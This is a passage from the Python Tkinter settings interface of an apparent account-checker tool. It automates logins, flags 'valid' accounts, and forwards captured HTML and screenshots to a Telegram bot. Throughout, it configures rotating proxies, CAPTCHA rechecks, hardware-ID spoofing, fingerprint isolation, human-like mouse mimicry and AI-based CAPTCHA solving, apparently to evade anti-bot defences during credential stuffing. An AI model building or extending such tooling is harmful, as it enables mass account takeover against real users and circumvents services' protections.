          foreground=[("focus", colors["fg"]), ("!disabled", colors["fg"])])

style.configure("TSpinbox", 
                fieldbackground=colors["surface"], 
                foreground=colors["fg"],
                insertcolor=colors["fg"])
style.map("TSpinbox",
          fieldbackground=[("focus", colors["surface"]), ("!disabled", colors["surface"])],
          foreground=[("focus", colors["fg"]), ("!disabled", colors["fg"])])

# Combobox Styling (Forces dropdown field and arrow to match high-contrast dark theme)
style.configure("TCombobox", 
                fieldbackground=colors["surface"], 
                foreground=colors["fg"], 
                background=colors["surface"],
                bordercolor=colors["border"],
                lightcolor=colors["border"],
                darkcolor=colors["border"],
                arrowcolor=colors["fg"])
style.map("TCombobox",
          fieldbackground=[("readonly", colors["surface"]), ("!disabled", colors["surface"])],
          foreground=[("readonly", colors["fg"]), ("!disabled", colors["fg"])])

# Globally configure the Combobox pop-up dropdown listbox background and text colors
window.option_add("*TCombobox*Listbox.background", colors["surface"])
window.option_add("*TCombobox*Listbox.foreground", colors["fg"])
window.option_add("*TCombobox*Listbox.selectBackground", colors["accent"])
window.option_add("*TCombobox*Listbox.selectForeground", colors["bg"])

# Checkbutton Styling
style.configure("TCheckbutton", background=colors["bg"], foreground=colors["fg_sub"])
style.map("TCheckbutton",
          background=[("active", colors["bg"])],
          foreground=[("active", colors["fg"])])

# LabelFrame Styling
style.configure("TLabelframe", background=colors["bg"], foreground=colors["accent"], borderwidth=1)
style.configure("TLabelframe.Label", background=colors["bg"], foreground=colors["accent"], font=("Inter", 10, "bold"))

# Set window background
window.configure(bg=colors["bg"])

# -------------------
# Outer layout: grid-based so the bottom section (Account Inputs + Start button)
# is ALWAYS visible - never pushed off-screen by the notebook expanding.
# Row 0 (weight=1): notebook fills all available vertical space.
# Row 1 (weight=0): bottom section is always anchored at the bottom.
# -------------------
outer_frame = tk.Frame(window, bg=colors["bg"])
outer_frame.pack(fill="both", expand=True)
outer_frame.grid_rowconfigure(0, weight=1)   # notebook row - expands
outer_frame.grid_rowconfigure(1, weight=0)   # bottom row  - fixed height, always visible
outer_frame.grid_columnconfigure(0, weight=1)

# Create notebook (tabs) - anchored to row 0, expands vertically
notebook = ttk.Notebook(outer_frame)
notebook.grid(row=0, column=0, padx=20, pady=(20, 5), sticky="nsew")

# --- General Settings Tab ---
frame_general = ttk.Frame(notebook)
notebook.add(frame_general, text="REQUIRED: General Settings")

# ── Draggable UI Elements Toolbar ─────────────────────────────────────────────
toolbar_frame = tk.Frame(frame_general, bg=colors["surface"], height=40)
toolbar_frame.pack(side="top", fill="x", padx=10, pady=5)

# 🔒 Lock Button
btn_lock = tk.Button(
    toolbar_frame,
    text=" 🔒 Lock ",
    font=("Inter", 9, "bold"),
    fg=colors["fg"],
    bg="#2d3748",
    activebackground=colors["accent"],
    relief="flat",
    bd=0,
    command=lambda: toggle_lock_ui(True)
)
btn_lock.pack(side="left", padx=5, pady=5)
CreateToolTip(btn_lock, "Prevent accidental reordering and lock editing")

# 🔓 Unlock Button
btn_unlock = tk.Button(
    toolbar_frame,
    text=" 🔓 Unlock ",
    font=("Inter", 9, "bold"),
    fg=colors["fg"],
    bg=colors["accent"],
    activebackground="#14b8a6",
    relief="flat",
    bd=0,
    command=lambda: toggle_lock_ui(False)
)
btn_unlock.pack(side="left", padx=5, pady=5)
CreateToolTip(btn_unlock, "Enable reordering and input editing")

# ↺ Reset to Default Button
btn_reset = tk.Button(
    toolbar_frame,
    text=" ↺ Reset to Default ",
    font=("Inter", 9, "bold"),
    fg=colors["fg"],
    bg="#2d3748",
    activebackground=colors["accent"],
    relief="flat",
    bd=0,
    command=lambda: reset_dnd_fields()
)
btn_reset.pack(side="left", padx=5, pady=5)
CreateToolTip(btn_reset, "Restore original 11 fields and order")

# 🎨 Theme Colors Button
btn_colors = tk.Button(
    toolbar_frame,
    text=" 🎨 Theme Colors ",
    font=("Inter", 9, "bold"),
    fg=colors["fg"],
    bg="#2d3748",
    activebackground=colors["accent"],
    relief="flat",
    bd=0,
    command=open_color_picker_dialog
)
btn_colors.pack(side="left", padx=5, pady=5)
CreateToolTip(btn_colors, "Open Theme Customizer to change interface colors")

# ➕ Add Workflow Rule Button
btn_add_rule = tk.Button(
    toolbar_frame,
    text=" ➕ Add Workflow Rule ",
    font=("Inter", 9, "bold"),
    fg=colors["fg"],
    bg=colors["accent"],
    activebackground="#14b8a6",
    relief="flat",
    bd=0,
    command=lambda: open_workflow_builder()
)
btn_add_rule.pack(side="left", padx=15, pady=5)
CreateToolTip(btn_add_rule, "Design and insert a complex custom automation step / timing rule")

# ── Scrollable Canvas for Draggable Blocks ──────────────────────────────────
canvas = tk.Canvas(frame_general, borderwidth=0, highlightthickness=0, bg=colors["bg"])
scrollbar = ttk.Scrollbar(frame_general, orient="vertical", command=canvas.yview)
scrollable_frame = tk.Frame(canvas, bg=colors["bg"])

scrollable_frame.bind(
    "<Configure>",
    lambda e: canvas.configure(
        scrollregion=canvas.bbox("all")
    )
)

canvas_window = canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
canvas.configure(yscrollcommand=scrollbar.set)

canvas.bind('<Configure>', lambda event: canvas.itemconfig(canvas_window, width=event.width))

def _on_mousewheel(event):
    canvas.yview_scroll(int(-1*(event.delta/120)), "units")

canvas.bind('<Enter>', lambda e: canvas.bind_all('<MouseWheel>', _on_mousewheel))
canvas.bind('<Leave>', lambda e: canvas.unbind_all('<MouseWheel>'))

canvas.pack(side="left", fill="both", expand=True)
scrollbar.pack(side="right", fill="y")

# Instantiate Global DraggableFieldManager
global field_manager
field_manager = DraggableFieldManager(scrollable_frame, fields_sequence, colors)
field_manager.rebuild_ui()


def toggle_lock_ui(lock_state):
    if lock_state:
        field_manager.lock_all()
        btn_lock.config(bg=colors["accent"], fg=colors["bg"])
        btn_unlock.config(bg="#2d3748", fg=colors["fg"])
    else:
        field_manager.unlock_all()
        btn_unlock.config(bg=colors["accent"], fg=colors["bg"])
        btn_lock.config(bg="#2d3748", fg=colors["fg"])


def reset_dnd_fields():
    global fields_sequence
    fields_sequence = [dict(f) for f in DEFAULT_FIELDS_SEQUENCE]
    field_manager.fields_data = fields_sequence
    field_manager.rebuild_ui()
    toggle_lock_ui(False)
    save_settings()


def add_custom_step_action():
    t = combo_step_type.get()
    label = entry_custom_label.get().strip()
    if not label or label == "My Custom Step":
        label = f"Custom {t}"
    
    t_map = {
        "Text Input": "custom_text",
        "Click Element": "custom_click",
        "Sleep Delay": "custom_sleep"
    }
    field_manager.add_field(t_map[t], label)

# --- Capture Settings Tab ---
frame_capture_settings = ttk.Frame(notebook)
notebook.add(frame_capture_settings, text="REQUIRED: Capture Settings")

# Inner HTML Capture Checkbox
chk_inner_html_capture = ttk.Checkbutton(
    frame_capture_settings,
    text="Enable Inner HTML Capture",
    variable=var_inner_html_capture,
)
chk_inner_html_capture.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_inner_html_capture, "Enable to capture the inner HTML of the page."
)

# Outer HTML Capture Checkbox
chk_outer_html_capture = ttk.Checkbutton(
    frame_capture_settings,
    text="Enable Outer HTML Capture",
    variable=var_outer_html_capture,
)
chk_outer_html_capture.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_outer_html_capture, "Enable to capture the outer HTML of the page."
)

# Capture Screenshot Checkbox (New)
chk_capture_screenshot = ttk.Checkbutton(
    frame_capture_settings,
    text="Capture Screenshot",
    variable=var_capture_screenshot,
)
chk_capture_screenshot.pack(side=tk.RIGHT, padx=10, pady=5, anchor="e")
CreateToolTip(
    chk_capture_screenshot,
    "Enable to capture a screenshot when a valid account is found.",
)

# CSS Selectors for Capture
ttk.Label(frame_capture_settings, text="CSS Selectors to Capture:").pack(
    padx=10, pady=(10, 5), anchor="w"
)

frame_capture_css_selectors = ttk.Frame(frame_capture_settings)
frame_capture_css_selectors.pack(padx=10, pady=5, fill="both", expand=True)

# Add a button to add new CSS selector
ttk.Button(
    frame_capture_settings,
    text="+ Add CSS Selector",
    command=add_capture_css_selector_frame,
).pack(padx=5, pady=5, anchor="w")
CreateToolTip(
    frame_capture_settings.children["!button"], "Add a new CSS selector to capture."
)

# Initialize with one CSS selector frame safely using window.after to prevent layout hangs
try:
    window.after(50, lambda: add_capture_css_selector_frame() if not capture_css_selector_frames else None)
except Exception:
    pass

# Redirect Link Entry
ttk.Label(frame_capture_settings, text="Redirect Link (Optional):").pack(
    padx=10, pady=(10, 5), anchor="w"
)
entry_redirect_link = ttk.Entry(
    frame_capture_settings, width=100, foreground="grey"
)
entry_redirect_link.pack(padx=10, pady=5, anchor="w")
placeholder_redirect_link = "Enter redirect link here..."
entry_redirect_link.insert(0, placeholder_redirect_link)
entry_placeholders.add(placeholder_redirect_link)


def on_focus_in_redirect(event):
    if entry_redirect_link.get() == "Enter redirect link here...":
        entry_redirect_link.delete(0, tk.END)
        entry_redirect_link.config(foreground="black")


def on_focus_out_redirect(event):
    if not entry_redirect_link.get():
        entry_redirect_link.insert(0, "Enter redirect link here...")
        entry_redirect_link.config(foreground="grey")


entry_redirect_link.bind("<FocusIn>", on_focus_in_redirect)
entry_redirect_link.bind("<FocusOut>", on_focus_out_redirect)
CreateToolTip(
    entry_redirect_link,
    "Enter a redirect link to navigate to after a valid account is found.",
)

# Telegram Bot Integration
ttk.Label(frame_capture_settings, text="Telegram Notifications:").pack(
    padx=10, pady=(10, 5), anchor="w"
)

frame_telegram = ttk.Frame(frame_capture_settings)
frame_telegram.pack(padx=10, pady=5, fill="both", expand=True)

chk_telegram_enabled = ttk.Checkbutton(
    frame_telegram,
    text="Enable Telegram Notifications",
    variable=var_telegram_enabled,
)
chk_telegram_enabled.grid(column=0, row=0, padx=5, pady=2, sticky="w")
CreateToolTip(
    chk_telegram_enabled, "Enable to send captured details to a Telegram bot."
)

ttk.Label(frame_telegram, text="Bot Token:").grid(
    column=0, row=1, padx=5, pady=2, sticky="e"
)
entry_telegram_bot_token = ttk.Entry(
    frame_telegram, width=50, textvariable=capture_telegram_bot_token
)
entry_telegram_bot_token.grid(column=1, row=1, padx=5, pady=2, sticky="w")
CreateToolTip(entry_telegram_bot_token, "Enter your Telegram Bot Token. [ This can be obtained from: t.me/BotFather ]")

ttk.Label(frame_telegram, text="Chat ID:").grid(
    column=0, row=2, padx=5, pady=2, sticky="e"
)
entry_telegram_chat_id = ttk.Entry(
    frame_telegram, width=50, textvariable=capture_telegram_chat_id
)
entry_telegram_chat_id.grid(column=1, row=2, padx=5, pady=2, sticky="w")
CreateToolTip(entry_telegram_chat_id, "Enter your Telegram Chat ID. [ This can be obtained from: t.me/getmyid_bot ]")

# --- Invalid Account Implementation Tab ---
frame_invalid_account = ttk.Frame(notebook)
notebook.add(frame_invalid_account, text="REQUIRED: Invalid Account")

chk_invalid_account_enabled = ttk.Checkbutton(
    frame_invalid_account,
    text="Check this and Enable Invalid Account Checks",
    variable=var_invalid_account_enabled,
)
chk_invalid_account_enabled.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_invalid_account_enabled,
    "Enable to implement invalid account validation.",
)

# Invalid Account Settings Layout
invalid_account_settings_list = [
    ("Redirect Detection URL:", "invalid_redirect"),
    ("Error/Alert Detection CSS Selector:", "invalid_error_selector"),
    ("Inner HTML Text:", "invalid_inner_html"),
    ("Outer HTML Text:", "invalid_outer_html"),
]

for idx, (label_text, var_name) in enumerate(invalid_account_settings_list):
    label = ttk.Label(frame_invalid_account, text=label_text)
    label.pack(padx=10, pady=5, anchor="w")

    entry = ttk.Entry(frame_invalid_account, width=100, foreground="grey")
    entry.pack(padx=10, pady=5, anchor="w")

    entry.insert(0, "Enter value here...")
    entry_placeholders.add("Enter value here...")

    def on_focus_in_invalid(event, entry=entry):
        if entry.get() == "Enter value here...":
            entry.delete(0, tk.END)
            entry.config(foreground="black")

    def on_focus_out_invalid(event, entry=entry):
        if not entry.get():
            entry.insert(0, "Enter value here...")
            entry.config(foreground="grey")

    entry.bind("<FocusIn>", lambda e, ent=entry: on_focus_in_invalid(e, ent))
    entry.bind("<FocusOut>", lambda e, ent=entry: on_focus_out_invalid(e, ent))

    tooltip_text = f"Input for {label_text}"
    CreateToolTip(entry, tooltip_text)

    globals()[f"entry_{var_name}"] = entry
    # Auto-save on every keystroke so typed values persist across restarts
    entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())

# --- CAPTCHA Input Wrong Implementation Tab ---
frame_captcha_wrong = ttk.Frame(notebook)
notebook.add(frame_captcha_wrong, text="OPTIONAL: CAPTCHA Incorrect is Recheck")

chk_captcha_wrong_enabled = ttk.Checkbutton(
    frame_captcha_wrong,
    text="Enable CAPTCHA Incorrect Checks",
    variable=var_captcha_wrong_enabled,
)
chk_captcha_wrong_enabled.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_captcha_wrong_enabled,
    "Enable to implement CAPTCHA validation and recheck if captcha is incorrect.",
)

# CAPTCHA Wrong Settings Layout
captcha_wrong_settings_list = [
    ("Redirect Detection URL:", "captcha_redirect"),
    ("Error/Alert Detection CSS Selector:", "captcha_error_selector"),
    ("Inner HTML Text:", "captcha_inner_html"),
    ("Outer HTML Text:", "captcha_outer_html"),
]

for idx, (label_text, var_name) in enumerate(captcha_wrong_settings_list):
    label = ttk.Label(frame_captcha_wrong, text=label_text)
    label.pack(padx=10, pady=5, anchor="w")

    entry = ttk.Entry(frame_captcha_wrong, width=100, foreground="grey")
    entry.pack(padx=10, pady=5, anchor="w")

    entry.insert(0, "Enter value here...")
    entry_placeholders.add("Enter value here...")

    def on_focus_in_captcha(event, entry=entry):
        if entry.get() == "Enter value here...":
            entry.delete(0, tk.END)
            entry.config(foreground="black")

    def on_focus_out_captcha(event, entry=entry):
        if not entry.get():
            entry.insert(0, "Enter value here...")
            entry.config(foreground="grey")

    entry.bind("<FocusIn>", lambda e, ent=entry: on_focus_in_captcha(e, ent))
    entry.bind("<FocusOut>", lambda e, ent=entry: on_focus_out_captcha(e, ent))

    tooltip_text = f"Input for {label_text}"
    CreateToolTip(entry, tooltip_text)

    globals()[f"entry_{var_name}"] = entry
    # Auto-save on every keystroke so typed values persist across restarts
    entry.bind("<KeyRelease>", lambda e: _schedule_auto_save())

# --- Proxy Settings Tab ---
frame_proxy = ttk.Frame(notebook)
notebook.add(frame_proxy, text="OPTIONAL: Proxy Settings")

# Proxy Settings Layout
chk_proxy_enabled = ttk.Checkbutton(
    frame_proxy, text="Enable Proxy", variable=var_proxy_enabled
)
chk_proxy_enabled.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(chk_proxy_enabled, "Enable or disable proxy usage.")

ttk.Label(frame_proxy, text="Proxy Type:").grid(
    column=0, row=1, padx=10, pady=5, sticky="e"
)
proxy_type_var = tk.StringVar(value="HTTP")
proxy_type_dropdown = ttk.OptionMenu(
    frame_proxy, proxy_type_var, "HTTP", "HTTP", "HTTPS", "SOCKS5"
)
proxy_type_dropdown.grid(column=1, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(proxy_type_dropdown, "Select the type of proxy to use.")

ttk.Label(frame_proxy, text="Proxy Mode:").grid(
    column=0, row=2, padx=10, pady=5, sticky="e"
)
proxy_mode_var = tk.StringVar(value="Static Proxies")
proxy_mode_dropdown = ttk.OptionMenu(
    frame_proxy, proxy_mode_var, "Static Proxies", "Static Proxies", "Rotating Proxies"
)
proxy_mode_dropdown.grid(column=1, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(proxy_mode_dropdown, "Choose between static or rotating proxies.")

ttk.Button(
    frame_proxy,
    text="Import Proxies from File",
    command=import_proxies_from_file,
).grid(column=0, row=3, padx=10, pady=10, sticky="w")
CreateToolTip(
    frame_proxy.children["!button"], "Import a list of proxies from a text file."
)

# --- Browser Settings Tab ---
frame_browser = ttk.Frame(notebook)
notebook.add(frame_browser, text="REQUIRED: Browser Settings")

# Browser Settings Layout
chk_cleanup_enabled = ttk.Checkbutton(
    frame_browser,
    text="Clean Browser Data After Each Account Check",
    variable=var_cleanup_enabled,
)
chk_cleanup_enabled.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_cleanup_enabled,
    "Enable to clean browser data after checking each account.",
)

chk_use_same_session_ui = ttk.Checkbutton(
    frame_browser,
    text="Use Same Browser Session for All Accounts",
    variable=var_use_same_session,
)
chk_use_same_session_ui.grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_use_same_session_ui,
    "When enabled, the browser remains open across checks. Cookies are cleared between accounts if clean-up is enabled.",
)

chk_incognito_mode = ttk.Checkbutton(
    frame_browser,
    text="Run Browser in Incognito Mode",
    variable=var_incognito_mode,
)
chk_incognito_mode.grid(column=0, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(chk_incognito_mode, "Enable to run the browser in Incognito mode.")

# --- Advanced Settings Tab ---
frame_advanced = ttk.Frame(notebook)
notebook.add(frame_advanced, text="OPTIONAL: Advanced Settings")

# Advanced Settings Layout
chk_load_extensions = ttk.Checkbutton(
    frame_advanced, text="Load Chrome Extensions", variable=var_load_extensions
)
chk_load_extensions.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_load_extensions,
    "Enable to load Chrome extensions from the chrome_extensions folder.",
)

chk_disable_notifications = ttk.Checkbutton(
    frame_advanced,
    text="Disable Browser Notifications",
    variable=var_disable_notifications,
)
chk_disable_notifications.grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(chk_disable_notifications, "Disable browser notifications.")

chk_disable_infobars = ttk.Checkbutton(
    frame_advanced, text="Disable Infobars", variable=var_disable_infobars
)
chk_disable_infobars.grid(column=0, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(chk_disable_infobars, "Disable infobars in the browser.")

chk_start_maximized = ttk.Checkbutton(
    frame_advanced, text="Start Browser Maximized", variable=var_start_maximized
)
chk_start_maximized.grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(chk_start_maximized, "Start the browser in maximized mode.")

chk_disable_extensions_option = ttk.Checkbutton(
    frame_advanced,
    text="Disable Browser Extensions",
    variable=var_disable_extensions_option,
)
chk_disable_extensions_option.grid(column=0, row=4, padx=10, pady=5, sticky="w")
CreateToolTip(chk_disable_extensions_option, "Disable all browser extensions.")

chk_headless = ttk.Checkbutton(
    frame_advanced, text="Run Browser in Headless Mode", variable=var_headless
)
chk_headless.grid(column=0, row=5, padx=10, pady=5, sticky="w")
CreateToolTip(chk_headless, "Run the browser in headless mode (no GUI).")

chk_custom_user_agents = ttk.Checkbutton(
    frame_advanced, text="Use Custom User Agents", variable=var_custom_user_agents
)
chk_custom_user_agents.grid(column=0, row=6, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_custom_user_agents, "Enable to use custom user agents from a file."
)

ttk.Button(
    frame_advanced, text="Select User Agents File", command=select_user_agents_file
).grid(column=0, row=7, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_advanced.children["!button"], "Select a text file containing custom user agents."
)

# Use Databases Checkbox (New)
chk_use_database = ttk.Checkbutton(
    frame_advanced, text="Use Databases", variable=var_use_database
)
chk_use_database.grid(column=0, row=8, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_use_database,
    "Enable to use databases for tracking checked accounts.",
)

# --- Chromedriver Arguments Tab ---
frame_chromedriver = ttk.Frame(notebook)
notebook.add(frame_chromedriver, text="OPTIONAL: Chromedriver Arguments")

# Chromedriver Arguments Layout
ttk.Label(frame_chromedriver, text="Add Chromedriver Argument:").grid(
    column=0, row=0, padx=10, pady=5, sticky="e"
)
entry_chromedriver_arg = ttk.Entry(frame_chromedriver, width=50, foreground="grey")
entry_chromedriver_arg.grid(column=1, row=0, padx=10, pady=5, sticky="w")
entry_chromedriver_arg.insert(0, "Enter argument here...")


def on_focus_in_chromedriver(event):
    if entry_chromedriver_arg.get() == "Enter argument here...":
        entry_chromedriver_arg.delete(0, tk.END)
        entry_chromedriver_arg.config(foreground="black")


def on_focus_out_chromedriver(event):
    if not entry_chromedriver_arg.get():
        entry_chromedriver_arg.insert(0, "Enter argument here...")
        entry_chromedriver_arg.config(foreground="grey")


entry_chromedriver_arg.bind("<FocusIn>", on_focus_in_chromedriver)
entry_chromedriver_arg.bind("<FocusOut>", on_focus_out_chromedriver)
CreateToolTip(
    entry_chromedriver_arg,
    "Enter a Chromedriver argument to add (e.g., --disable-gpu).",
)

ttk.Button(
    frame_chromedriver, text="Add Argument", command=add_chromedriver_argument
).grid(column=2, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_chromedriver.children["!button"], "Add the entered Chromedriver argument."
)

ttk.Label(frame_chromedriver, text="Current Chromedriver Arguments:").grid(
    column=0, row=1, padx=10, pady=5, sticky="nw"
)
listbox_chromedriver_args = tk.Listbox(frame_chromedriver, height=10, width=80)
listbox_chromedriver_args.grid(column=1, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(
    listbox_chromedriver_args, "List of current Chromedriver arguments."
)

ttk.Button(
    frame_chromedriver,
    text="Remove Selected Argument(s)",
    command=remove_chromedriver_argument,
).grid(column=1, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_chromedriver.children["!button2"],
    "Remove the selected Chromedriver argument(s).",
)

ttk.Label(frame_chromedriver, text="Find more Chromium Command-Line Switches:").grid(
    column=0, row=3, padx=10, pady=10, sticky="e"
)
help_link = tk.Label(
    frame_chromedriver,
    text="https://peter.sh/experiments/chromium-command-line-switches/",
    foreground="blue",
    cursor="hand2",
)
help_link.grid(column=1, row=3, padx=10, pady=10, sticky="w")
help_link.bind(
    "<Button-1>",
    lambda e: webbrowser.open(
        "https://peter.sh/experiments/chromium-command-line-switches/"
    ),
)
CreateToolTip(help_link, "Open Chromium Command-Line Switches in your browser.")

# --- Mouse Click Automation Tab ---
frame_mouse_clicks_tab = ttk.Frame(notebook)
notebook.add(frame_mouse_clicks_tab, text="OPTIONAL: Mouse Click Automation")

chk_enable_mouse_clicks = ttk.Checkbutton(
    frame_mouse_clicks_tab,
    text="Enable Mouse Click Automation",
    variable=var_enable_mouse_clicks,
)
chk_enable_mouse_clicks.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_enable_mouse_clicks,
    "Enable to automate mouse clicks at specified coordinates or CSS selectors.",
)

# Coordinate Clicks Section
ttk.Label(frame_mouse_clicks_tab, text="Coordinate-based Clicks:").grid(column=0, row=1, padx=10, pady=5, sticky="w")

frame_mouse_clicks = ttk.Frame(frame_mouse_clicks_tab)
frame_mouse_clicks.grid(column=0, row=2, padx=10, pady=5, sticky="w")

ttk.Button(
    frame_mouse_clicks_tab,
    text="+ Add Click Action",
    command=add_mouse_click_action_extended,
).grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_mouse_clicks_tab.children["!button"], "Add a new mouse click action."
)

# CSS Selector Clicks Section
ttk.Label(frame_mouse_clicks_tab, text="CSS Selector-based Clicks:").grid(column=0, row=4, padx=10, pady=10, sticky="w")

frame_css_clicks = ttk.Frame(frame_mouse_clicks_tab)
frame_css_clicks.grid(column=0, row=5, padx=10, pady=5, sticky="w")

ttk.Button(
    frame_mouse_clicks_tab,
    text="+ Add CSS Selector Click Action",
    command=add_css_click_action,
).grid(column=0, row=6, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_mouse_clicks_tab.children["!button2"], "Add a new CSS selector click action."
)

# --- Advanced Stealth & AI Tab ---
frame_stealth = ttk.Frame(notebook)
notebook.add(frame_stealth, text="VALIDATOR PRO: Stealth & AI")

# Stealth Settings Layout
chk_isolation = ttk.Checkbutton(
    frame_stealth, text="Enable Isolated Sessions (Unique Ports & Directories)", variable=var_isolation
)
chk_isolation.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(chk_isolation, "Assigns a randomized port and entirely isolated profile directory to each validation process.")

chk_developer_mode = ttk.Checkbutton(
    frame_stealth, text="Enable Developer Mode for Extensions (Required for --load-extension)", variable=var_developer_mode
)
chk_developer_mode.grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(chk_developer_mode, "After each browser launch, automatically enables Developer Mode in chrome://extensions so that all loaded extensions (Buster, etc.) are recognised and active. Disable only if the target site detects the extensions page visit.")

chk_reinstall = ttk.Checkbutton(
    frame_stealth, text="Enable Kernel-Level Purge (AppData wiping)", variable=var_reinstall
)
chk_reinstall.grid(column=0, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(chk_reinstall, "Fully purges browser data processes upon critical block.")

chk_hwid_spoof = ttk.Checkbutton(
    frame_stealth, text="Enable HWID Subsystem Spoofing", variable=var_hwid_spoof
)
chk_hwid_spoof.grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(chk_hwid_spoof, "Rotates MachineGuid iteratively to hide hardware identity.")

chk_jitter = ttk.Checkbutton(
    frame_stealth, text="Enable Persona Jitter (Bézier Mimicry)", variable=var_jitter
)
chk_jitter.grid(column=0, row=4, padx=10, pady=5, sticky="w")
CreateToolTip(chk_jitter, "Replaces basic macro clicks with psychologically-modeled Bézier mouse movements and typing.")

ttk.Label(frame_stealth, text="OpenRouter API Key(s) [Comma separated]:").grid(
    column=0, row=4, padx=10, pady=10, sticky="e"
)
entry_openrouter_keys = ttk.Entry(frame_stealth, width=50, textvariable=var_openrouter_keys)
entry_openrouter_keys.grid(column=1, row=4, padx=10, pady=10, sticky="w")
CreateToolTip(entry_openrouter_keys, "Required for AI CAPTCHA Solving. Separate with commas.")

ttk.Label(frame_stealth, text="AI Vision Model:").grid(
    column=0, row=5, padx=10, pady=10, sticky="e"
)
combo_openrouter_model = ttk.Combobox(frame_stealth, width=47, textvariable=var_openrouter_model)
combo_openrouter_model.grid(column=1, row=5, padx=10, pady=10, sticky="w")
CreateToolTip(combo_openrouter_model, "Free model name like 'google/gemini-2.0-flash-lite-preview-02-05:free'")

# ── Claude proxy fallback widgets ─────────────────────────────────────────────
_claude_frame = ttk.LabelFrame(frame_stealth, text="Claude Proxy Fallback (antigravity-claude-proxy)")
_claude_frame.grid(column=0, row=6, columnspan=2, padx=10, pady=(6, 2), sticky="ew")

ttk.Checkbutton(
    _claude_frame,
    text="Use Claude Proxy as fallback when OpenRouter is unavailable",
    variable=var_claude_proxy_enabled,
).grid(column=0, row=0, columnspan=2, padx=8, pady=(6, 2), sticky="w")

ttk.Label(_claude_frame, text="Claude Proxy URL:").grid(
    column=0, row=1, padx=8, pady=4, sticky="e"
)
_entry_claude_url = ttk.Entry(_claude_frame, width=40, textvariable=var_claude_proxy_url)
_entry_claude_url.grid(column=1, row=1, padx=8, pady=4, sticky="w")
CreateToolTip(
    _entry_claude_url,
    "URL of a running antigravity-claude-proxy instance.\n"
    "Default: http://localhost:8080\n"
    "Start it with: npx antigravity-claude-proxy@latest start",
)

ttk.Label(_claude_frame, text="Claude Proxy Model:").grid(
    column=0, row=2, padx=8, pady=(4, 8), sticky="e"
)
_entry_claude_model = ttk.Entry(_claude_frame, width=40, textvariable=var_claude_proxy_model)
_entry_claude_model.grid(column=1, row=2, padx=8, pady=(4, 8), sticky="w")
CreateToolTip(
    _entry_claude_model,
    "Model name to use via the Claude proxy.\n"
    "Examples: claude-sonnet-4-6-thinking, claude-opus-4-6-thinking,\n"
    "gemini-3.1-pro-high[1m]",
)


def fetch_and_populate_models(keys):
    """Fetches live free models from OpenRouter. Runs in a background thread.
    All Tkinter UI updates are dispatched via window.after() to stay on the main thread."""
    try:
        if not keys:
            def _warn_no_keys():
                try:
                    print_action("Failed to auto-update free models: At least one OpenRouter API Key is required.")
                except Exception:
                    pass
            try:
                window.after(0, _warn_no_keys)
            except Exception:
                pass
            return
        client = OpenRouterClient(api_keys=keys)
        client.fetch_live_free_models_sync()
        models = [m for m in client.FREE_MODELS if m.endswith(":free")]
        if models:
            captured_models = list(models)
            def update_model_ui():
                try:
                    combo_openrouter_model['values'] = captured_models
                    if var_openrouter_model.get() not in captured_models:
                        var_openrouter_model.set(captured_models[0])
                except tk.TclError:
                    pass
            try:
                window.after(0, update_model_ui)
            except Exception:
                pass
    except Exception as e:
        captured_err = str(e)
        def err_print():
            try:
                print_action(f"Failed to auto-update free models: {captured_err}")
            except Exception:
                pass
        try:
            window.after(0, err_print)
        except Exception:
            print(f"[BG Thread] Failed to auto-update free models: {captured_err}")

# Snapshot keys on the main thread before spawning background thread
_keys = [k.strip() for k in var_openrouter_keys.get().split(",") if k.strip()]
threading.Thread(target=fetch_and_populate_models, args=(_keys,), daemon=True).start()

# Live Entropy Monitor Canvas
ttk.Label(frame_stealth, text="Live Entropy Monitor:").grid(
    column=0, row=6, padx=10, pady=10, sticky="e"
)
entropy_canvas = tk.Canvas(frame_stealth, width=300, height=60, bg="#111111", highlightthickness=1, highlightbackground="#333333")
entropy_canvas.grid(column=1, row=6, padx=10, pady=10, sticky="w")

def calculate_uniqueness_score():
    score = 45  # Base score for undetected chromedriver
    try:
        if globals().get('var_proxy_enabled') and var_proxy_enabled.get():
            score += 15
        if globals().get('var_isolation') and var_isolation.get():
            score += 10
        if globals().get('var_custom_user_agents') and var_custom_user_agents.get():
            score += 10
        if globals().get('var_hwid_spoof') and var_hwid_spoof.get():
            score += 10
        if globals().get('var_jitter') and var_jitter.get():
            score += 5
        if globals().get('var_reinstall') and var_reinstall.get():
            score += 5
        if globals().get('var_incognito_mode') and var_incognito_mode.get():
            score += 2
        # Adding rules variables checking
        if globals().get('vars_actions') and 'security_fingerprint_enabled' in vars_actions and vars_actions['security_fingerprint_enabled'].get():
            score += 5
        if globals().get('vars_actions') and 'security_antibot_enabled' in vars_actions and vars_actions['security_antibot_enabled'].get():
            score += 5
    except Exception as e:
        pass

    score += random.randint(-2, 2)
    return max(0, min(99, score))

def update_entropy_graph():
    # Only update if canvas exists
    try:
